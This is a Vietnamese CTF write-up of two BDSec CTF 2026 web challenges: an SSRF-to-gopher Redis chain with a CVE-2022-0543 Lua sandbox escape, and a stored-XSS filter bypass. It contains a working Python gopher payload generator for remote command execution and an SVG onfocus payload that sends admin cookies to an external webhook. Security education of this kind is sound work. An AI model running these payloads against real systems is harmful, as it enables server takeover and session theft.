---
title: "[Write-up] BDSec CTF 2026 – Web Challenges"
published: 2026-07-22
tags: [CTF, BDSecCTF]
category: Write-up
description: Thật vui khi những nỗ lực trong suốt quá trình tham gia BDSec CTF 2026 đã mang lại kết quả và giúp mình ghi được những điểm số đáng nhớ.
draft: false
image: /assets/data/bannerbdsec2026.png
---

# Linkspire

## 1. Challenge Overview

- **Target:** Web Application (Link Shortener & Preview Service)
- **Score:** 380 points
- **Author:** badhacker0x1
- **Final Flag:** `bdsec{Deb1an_R3d1s_lua_sandb0x_esc4pe_thr0ugh_a_g0pher_h0le}`

### TL;DR / Attack Chain

```text
[Preview SSRF Filter Bypass]
       │ (Shortlink localhost:5000)
       ▼
[302 Redirect to gopher://redis:6379]
       │ (pycurl PROTO_ALL)
       ▼
[Internal Redis Command Injection (Unauth)]
       │ (CVE-2022-0543 Lua Sandbox Escape)
       ▼
[Root RCE in Redis Container] ──► Read /flag.txt
```

---

## 2. Reconnaissance & Vulnerability Analysis

### Frontend Disclosure

Kiểm tra HTML source code phát hiện comment nhạy cảm do đội ngũ DevOps để lại:

```html
<!--
  Linkspire frontend build 1.4.2
  TODO(sre): our internal redis box (redis:6379) is still wide open, no auth.
  lock it down before we go public. -devops
-->
```

**Thông tin thu thập:**

- Backend giao tiếp với internal Redis instance tại host `redis:6379` không có mật khẩu.
- Web app chạy tại `localhost:5000`.

---

### Source Code Audit via Arbitrary File Read

Ứng dụng có 2 endpoint chính: `/api/shorten` và `/api/preview`.

Do tính năng Preview hỗ trợ mọi scheme khi làm theo chuyển hướng (redirect), ta có thể đọc file hệ thống bằng cách tạo shortlink trỏ tới file local:

1. Rút gọn URL: `file:///app/app.py`
2. Preview shortlink vừa tạo để đọc toàn bộ source code backend.

#### Phân tích lỗ hổng trong Source Code:

**1. Logic Shortlink (`/api/shorten` & `/l/<token>`):**

- Shortlink không lưu trong Redis mà mã hóa URL trực tiếp bằng Base64Url trong token.
- Endpoint `/l/<token>` giải mã Base64 và trả về `302 Redirect` đến URL đích mà không kiểm tra scheme hay destination.

```python
@app.route("/l/<token>")
def follow(token):
    # ... decode token ...
    resp = Response(status=302)
    resp.headers["Location"] = target
    return resp
```

**2. Bẫy kiểm tra SSRF tại `/api/preview`:**

- Endpoint `/api/preview` áp dụng blacklist để chặn URL nội bộ (`host_is_internal`) và chỉ cho phép `http/https`.

```python
if parsed.scheme not in ("http", "https"):
    return jsonify(error="Only http/https URLs can be previewed."), 400
if host_is_internal(parsed.hostname):
    return jsonify(error="Refusing to fetch an internal/private address."), 400
```

**3. Sai lầm cấu hình `pycurl`:**

- Mặc dù bước kiểm tra ban đầu rất nghiêm ngặt, client HTTP (`pycurl`) lại được cấu hình cho phép tự động chuyển hướng (`FOLLOWLOCATION`) và chấp nhận **mọi protocol** (`PROTO_ALL`) khi chuyển hướng.

```python
c.setopt(c.FOLLOWLOCATION, True)
c.setopt(c.PROTOCOLS, pycurl.PROTO_ALL)
c.setopt(c.REDIR_PROTOCOLS, pycurl.PROTO_ALL)
```

> **Gốc rễ lỗ hổng (Root Cause):** Chế độ kiểm tra URL chỉ áp dụng cho request đầu tiên. Nếu ta truyền URL `http://localhost:5000/l/<token>`, filter sẽ cho qua vì domain thuộc ứng dụng. Khi `pycurl` thực hiện request, nó sẽ nhận phản hồi `302 Redirect` trỏ về `gopher://redis:6379/...` và tiếp tục truy vấn protocol `gopher://` do flag `REDIR_PROTOCOLS = PROTO_ALL`.

---

## 3. Exploit Development

### Step 1: Confirming Gopher -> Redis SSRF

Thực hiện kiểm tra kết nối tới Redis thông qua protocol `gopher://`:

```text
PING
QUIT
```

Chuyển đổi sang định dạng RESP (Redis Serialization Protocol):

```text
*1\r\n$4\r\nPING\r\n*1\r\n$4\r\nQUIT\r\n
```

Gopher payload:
`gopher://redis:6379/_%2A1%0D%0A%244%0D%0APING%0D%0A%2A1%0D%0A%244%0D%0AQUIT%0D%0A`

Response trả về từ preview chứa `+PONG` xác nhận đã có thể gửi lệnh thành công tới Redis.

---

### Step 2: Failed Paths & Pivot Analysis

Trong quá trình khai thác, một số hướng đi chuẩn của Redis đã bị loại trừ:

- **Shortlink Poisoning:** Phân tích source code cho thấy shortlink xử lý hoàn toàn qua Base64 token trên Flask, không đọc dữ liệu từ Redis.
- **RDB Webroot Write (`CONFIG SET dir`):** Redis nằm ở một Docker container độc lập, không dùng chung volume `/app` hay `/var/www/html` với Web container.
- **Cronjob RCE:** Kiểm tra quyền ghi cho thấy Redis chạy dưới user hạn chế, chỉ có quyền ghi vào `/var/lib/redis` và `/dev/shm`. Thao tác `SAVE` vào `/etc/cron.d` thất bại (`Permission denied`).
- **Web Container LFI to Flag:** Đọc file qua `file://` chỉ truy cập được filesystem của Web container. Tuy nhiên, flag nằm ở một container khác (Redis container).

---

### Step 3: Redis Lua Sandbox Escape (CVE-2022-0543)

Thực hiện lệnh `INFO` thu được thông tin môi trường:

- **Redis Version:** `5.0.7`
- **OS:** `Ubuntu / Debian`

Phiên bản Redis cài đặt từ package manager của Debian/Ubuntu dính lỗ hổng **CVE-2022-0543** do thư viện Lua không được đóng băng đúng cách, cho phép load thư viện `io` gốc của hệ thống thông qua `package.loadlib`.

#### Generic Lua Payload:

```lua
local f = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io');
local io = f();
local p = io.popen('COMMAND_HERE', 'r');
local r = p:read('*a');
p:close();
return r
```

---

## 4. Execution & Flag Extraction

### Payload Generator (Python Script)

Do giao thức RESP yêu cầu tính toán chính xác độ dài chuỗi (Byte Count), việc viết tay dễ dẫn đến lỗi `Protocol error: expected '$'`. Sử dụng script sau để khởi tạo payload chuẩn xác:

```python
from urllib.parse import quote

def build_gopher_payload(cmd: str) -> str:
    lib_path = "/usr/lib/x86_64-linux-gnu/liblua5.1.so.0"
    lua_script = (
        f"local f=package.loadlib('{lib_path}','luaopen_io'); "
        f"local io=f(); "
        f"local p=io.popen([[{cmd}]],'r'); "
        f"local r=p:read('*a'); "
        f"p:close(); "
        f"return r"
    )

    script_bytes = lua_script.encode('utf-8')

    # RESP Format: EVAL <script> 0
    resp_payload = (
        f"*3\r\n"
        f"$4\r\nEVAL\r\n"
        f"${len(script_bytes)}\r\n{lua_script}\r\n"
        f"$1\r\n0\r\n"
        f"*1\r\n$4\r\nQUIT\r\n"  # Lệnh QUIT giúp đóng socket ngay lập tức tránh Timeout
    )

    return "gopher://redis:6379/_" + quote(resp_payload)

# Example: Đọc file flag
print(build_gopher_payload("cat /flag.txt"))
```

---

### Execution Steps

1. Chạy script để tạo payload `gopher://redis:6379/...` chứa lệnh `cat /flag.txt`.
2. Gửi payload vào endpoint `/api/shorten` để lấy shortlink dạng `http://localhost:5000/l/<token>`.
3. Gửi URL shortlink thu được vào `/api/preview`.
4. Web server thực hiện fetch -> redirect sang Gopher -> gửi lệnh Lua đến Redis -> nhận kết quả flag.

```text
Preview Response:
bdsec{Deb1an_R3d1s_lua_sandb0x_esc4pe_thr0ugh_a_g0pher_h0le}
```

---

## 5. Key Takeaways & Remediation

1. **SSRF Mitigation:** Khi sử dụng thư viện cURL/pycurl để fetch URL external, cần giới hạn `REDIR_PROTOCOLS` chỉ cho phép `HTTP/HTTPS` thay vì `PROTO_ALL`.
2. **Shortlink Redirect Validation:** Mọi chuyển hướng (Redirect Location) từ các dịch vụ nội bộ cần phải được validation lại trước khi thực hiện request tiếp theo.
3. **Internal Security:** Dịch vụ Redis nội bộ cần được cấu hình Authentication (`requirepass`) và áp dụng Bind Address hợp lý, hạn chế tối đa việc tin tưởng tuyệt đối vào mạng nội bộ.

---

# Ticketly

## 1. Challenge Overview

- **Target:** Web Application — hệ thống support ticket
- **Challenge Name:** Ticketly — Support Desk
- **Category:** Web
- **Vulnerability:** Stored XSS / Unsafe HTML Rendering
- **Final Impact:** Thực thi JavaScript trong ngữ cảnh admin

### TL;DR / Attack Chain

```text
[Create Support Ticket]
       │ (ứng dụng cho phép HTML formatting)
       ▼
[Weak BDSEC Firewall™ Blacklist]
       │ (chỉ chặn một số signature phổ biến)
       ▼
[Stored HTML Injection in ticket-body]
       │ (HTML và attribute được render thành DOM thật)
       ▼
[Report Ticket to Admin]
       │ (admin mở ticket nhưng không click link)
       ▼
[SVG + autofocus + onfocus]
       │ (event tự kích hoạt khi trang được mở/focus)
       ▼
[Stored XSS in Admin Browser] ──► Exfiltrate admin cookie / retrieve flag
```

---

## 2. Reconnaissance & Vulnerability Analysis

### Initial Functionality

Ứng dụng là một support desk đơn giản. Người dùng có thể đăng ký, đăng nhập, tạo ticket, xem ticket đã gửi và report ticket để admin review.

Ở trang chủ có hai gợi ý khá quan trọng:

```text
Formatting is supported.
An administrator reads every reported ticket.
```

Hai câu này cho thấy nội dung ticket có khả năng được render dưới dạng HTML/formatting, đồng thời ticket sau khi report sẽ được admin mở để đọc. Đây là dấu hiệu rất giống một bài stored XSS.

---

### Basic XSS Attempts

Payload đầu tiên được thử là dạng classic:

```html
<script>
  alert("XSS");
</script>
```

Request bị chặn bởi firewall custom của challenge:

```text
Request blocked by BDSEC Firewall™
Your ticket contained content that matched a malicious signature and was not saved.

Signature: SCRIPT_TAG
```

Một số payload phổ biến khác cũng bị chặn:

```text
<iframe>   → IFRAME_TAG
<object>   → OBJECT_TAG
alert      → ALERT
<img ...>  → bị chặn hoặc bị render thành text tùy context
```

Từ đây có thể thấy ứng dụng không dùng sanitizer chuẩn, mà có vẻ dùng blacklist để phát hiện một số pattern nguy hiểm thường gặp.

---

### Testing Allowed Formatting

Vì trang chủ nói rằng formatting được hỗ trợ, mình thử các thẻ HTML vô hại hơn:

```html
<h1>TEST</h1>
<a href="https://example.com" title="t" class="c" id="i">X</a>
<div class="box">Y</div>
<span id="s">Z</span>
```

Các thẻ này được render thành HTML thật trong trang ticket.

Trong DevTools, phần nội dung ticket xuất hiện dưới dạng các DOM node thật bên trong:

```html
<div class="ticket-body">
  <h1>TEST</h1>
  <a href="https://example.com" title="t" class="c" id="i">X</a>
  <div class="box">Y</div>
  <span id="s">Z</span>
</div>
```

Điều này xác nhận rằng user input không được escape an toàn trước khi render ra page.

---

## 3. Exploit Development

### Why a Normal Link Was Not Enough

Ban đầu mình thử dùng một link canary đơn giản:

```html
<a href="https://webhook.site/...">Click me</a>
```

Tuy nhiên webhook không nhận request.

Từ đó rút ra hành vi quan trọng:

- admin có mở ticket sau khi report;
- nhưng admin không click vào link trong ticket.

Vì vậy payload cần tự kích hoạt khi ticket được mở, không được phụ thuộc vào thao tác click của admin.

---

### Failed / Eliminated Paths

Một số hướng phổ biến không dùng được:

- `<script>` bị chặn bởi `SCRIPT_TAG`.
- `<iframe>` bị chặn bởi `IFRAME_TAG`.
- `<object>` bị chặn bởi `OBJECT_TAG`.
- Từ khóa literal `alert` bị chặn bởi `ALERT`.
- Link `<a href=...>` bình thường cần người dùng click, trong khi admin không click.
- Cách encode trong tên attribute như `o&#x6e;load` không hiệu quả, vì HTML entity không được decode trong tên attribute.

Yêu cầu của payload lúc này là phải tìm một cấu trúc HTML/SVG được phép render, có event tự chạy khi trang được mở.

```text
Find an allowed HTML/SVG structure with an event that triggers without a user click.
```

---

### Working Primitive: SVG + autofocus + onfocus

Hướng khai thác thành công là dùng SVG kết hợp với thẻ anchor.

Payload dựa vào các điều kiện sau:

- `<svg>` được render thành DOM thật;
- `<a>` được phép nằm trong SVG;
- attribute `autofocus` được giữ lại;
- attribute `onfocus` được giữ lại;
- không có CSP nên inline handler có thể chạy.

Payload PoC để xác nhận XSS:

```html
<svg width="200" height="200" xmlns="http://w3.org" xmlns:xlink="http://w3.org">
  <a
    xlink:href="#"
    autofocus="true"
    onfocus="new Image().src='https://webhook.site'; &#x61;lert(String.fromCharCode(88,83,83))"
  >
    <text x="20" y="100" fill="blue" font-size="20" style="cursor:pointer;">
      Click Me!
    </text>
  </a>
</svg>
```

Firewall chặn từ khóa literal `alert`, nên ký tự đầu tiên được encode bằng HTML entity:

```html
&#x61;lert
```

Khi browser parse HTML, `&#x61;` được decode thành chữ `a`, từ đó tạo thành:

```javascript
alert;
```

Chuỗi `XSS` cũng được tạo bằng JavaScript thay vì viết trực tiếp:

```javascript
String.fromCharCode(88, 83, 83);
```

---

## 4. Execution & Flag Extraction

### Final Payload

Sau khi xác nhận JavaScript có thể chạy, payload được đổi sang gửi cookie của admin về webhook.

```html
<svg
  width="200"
  height="200"
  xmlns="http://www.w3.org/2000/svg"
  xmlns:xlink="http://www.w3.org/1999/xlink"
>
  <a
    xlink:href="#"
    autofocus="true"
    onfocus="fetch('https://webhook.site/d81a9905-7add-4e08-86ec-c5aa957d0cc2?c='+btoa(document.cookie))"
  >
    <text x="20" y="100" fill="blue" font-size="20" style="cursor:pointer;">
      Click Me!
    </text>
  </a>
</svg>
```

---

### Payload Breakdown

Đoạn sau tạo SVG context được ứng dụng chấp nhận và render:

```html
<svg ...></svg>
```

Đoạn sau tạo một SVG anchor có thể nhận focus. Khi trang được mở, `autofocus` khiến element nhận focus và kích hoạt `onfocus`:

```html
<a xlink:href="#" autofocus="true" onfocus="..."></a>
```

Đoạn JavaScript sau gửi cookie hiện tại về webhook:

```javascript
fetch("https://webhook.site/... ?c=" + btoa(document.cookie));
```

Cookie được base64 encode để tránh lỗi ký tự đặc biệt trong URL:

```javascript
btoa(document.cookie);
```

---

### Exploitation Steps

1. Tạo một ticket mới.
2. Đưa SVG payload vào phần body của ticket.
3. Submit ticket.
4. Report ticket cho admin.
5. Chờ admin bot/user mở ticket.
6. Webhook nhận cookie đã được encode.
7. Decode cookie, dùng session đó để truy cập ngữ cảnh admin hoặc lấy flag trong môi trường CTF.

---

## 5. Key Takeaways & Remediation

### Key Takeaways

1. **Blacklist filtering is fragile.**  
   Chỉ chặn các chuỗi phổ biến như `script`, `iframe`, `object`, `alert`... là không đủ.

2. **HTML formatting support must be carefully sandboxed.**  
   Nếu muốn hỗ trợ formatting, ứng dụng cần sanitize nội dung bằng allowlist chặt chẽ.

3. **Event attributes are dangerous.**  
   Các attribute như `onfocus`, `onclick`, `onload` không nên được phép xuất hiện trong user-generated content.

4. **CSP would reduce impact.**  
   CSP nghiêm ngặt có thể chặn inline script và làm việc khai thác khó hơn.

5. **Admin review flows are high-risk sinks.**  
   Nội dung mà admin mở phải luôn được xem là untrusted input và cần render an toàn.

---

### Recommended Fixes

- Escape nội dung ticket theo mặc định trước khi render.
- Nếu cần hỗ trợ formatting, dùng sanitizer trưởng thành như DOMPurify với allowlist chặt.
- Loại bỏ toàn bộ event-handler attributes khỏi nội dung do user nhập.
- Không cho phép SVG nếu không thực sự cần thiết.
- Thêm Content Security Policy nghiêm ngặt, ví dụ:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none';
```

- Cấu hình cookie session với các thuộc tính bảo vệ:

```http
HttpOnly; Secure; SameSite=Lax
```

---

## 6. Conclusion

Ticketly dính stored XSS vì nội dung ticket do người dùng nhập được render dưới dạng raw HTML. BDSEC Firewall™ chỉ chặn một vài signature phổ biến, trong khi vẫn để lọt tổ hợp SVG và event handler.

Payload cuối cùng dùng SVG anchor với `autofocus` và `onfocus` để JavaScript tự chạy khi admin mở ticket, từ đó lấy được session/admin context trong môi trường CTF.
